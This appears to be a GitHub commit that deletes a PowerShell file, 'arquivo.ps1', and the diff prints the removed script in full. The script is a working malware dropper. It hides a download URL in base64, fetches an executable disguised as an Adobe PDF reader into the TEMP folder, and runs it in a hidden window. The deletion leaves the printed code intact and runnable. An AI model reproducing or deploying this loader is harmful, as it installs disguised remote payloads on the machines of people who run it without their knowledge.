71ada12adce0fee44247ca07bb5645b611f8ea0e
corinthias <89884709+corinthias2025@users.noreply.github.com>
2025-07-29 12:44:06 -0300

    Delete arquivo.ps1

--- arquivo.ps1
+++
@@ -1,6 +0,0 @@
-$e = [Text.Encoding]::UTF8
-$d = 'aHR0cHM6Ly90ZXN0YW5kbzEyMy1ibG9uZC52ZXJjZWwuYXBwL0Fkb2JlJTIwLSUyMExlaXRvciUyMGRlJTIwUERGLmV4ZQ=='
-$p = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))
-$f = "$env:TEMP\Adobe Documento PDF.exe"
-(New-Object Net.WebClient).DownloadFile($p, $f)
-Start-Process -FilePath $f -WindowStyle Hidden
